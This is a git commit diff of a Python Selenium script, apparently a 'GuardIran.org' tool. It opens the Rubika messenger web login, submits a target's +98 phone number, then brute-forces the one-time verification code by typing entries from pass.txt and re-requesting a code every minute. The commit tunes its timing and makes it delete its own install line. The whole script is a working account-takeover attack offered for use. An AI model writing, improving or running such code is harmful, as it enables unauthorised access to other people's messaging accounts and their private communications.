f06fa5dbef2f6625689dcf8994e690598dcb27b0
Ali Zobeid <98078407+Alizubeid@users.noreply.github.com>
2022-04-06 15:14:14 +0430

    Update run.py

--- run.py
+++ run.py
@@ -1,12 +1,12 @@
-
 from selenium import webdriver as wb
 import time,platform,os
 from pyfiglet import figlet_format as font
 def Rubika():
-    REQUIREMENTS=os.system('pip install -r requirements.txt')
+    requireme=os.system('pip install -r requirements.txt')
+    with open('./run.py') as reader:
+        new_file_=reader.read().replace("    requireme=os.system('pip install -r requirements.txt')","")
     with open('./run.py','w') as writed:
-        new_file_python=writed.replace("REQUIREMENTS=os.system('pip install -r requirements.txt')",'')
-        writed.write(new_file_python)
+        writed.write(new_file_)
     def CLEAR():
         Clear_Cls=print(font('GuardIran.org'))
     os_INFO=platform.uname()
@@ -24,18 +24,18 @@ def Rubika():
     time.sleep(2)
     drive.find_element_by_xpath('/html/body/app-root/tab-login/div/div/div[2]/div[1]/div/div[3]/div[3]/input[1]').send_keys(Number_CellPhone)
     drive.find_element_by_xpath('/html/body/app-root/tab-login/div/div/div[2]/div[1]/div/div[3]/button/div/div').click()
-    time.sleep(.3)
+    time.sleep(4)
     stop=time.time()+61
     with open('./pass.txt','r') as passlist:
         for i in passlist.read().split():
             if stop<=time.time():
-                stop=time.time()+60
+                stop=time.time()+62
                 drive.find_element_by_xpath('/html/body/app-root/tab-login/div/div/div[2]/div[2]/div/div[3]/p/a/span').click()
                 time.sleep(.1)
                 print('\n\n         >>>>>>   UPDATE   TIME  <<<<<<\n\n')
 
             print(f'\n\n\n                      TEST CODE {i} ON  +98{Number_CellPhone}')
+            drive.find_element_by_xpath('/html/body/app-root/tab-login/div/div/div[2]/div[2]/div/div[4]/div/input').click()
             drive.find_element_by_xpath('/html/body/app-root/tab-login/div/div/div[2]/div[2]/div/div[4]/div/input').send_keys(str(i))
-            time.sleep(.001)
             drive.find_element_by_xpath('/html/body/app-root/tab-login/div/div/div[2]/div[2]/div/div[4]/div/input').clear()
 Rubika()
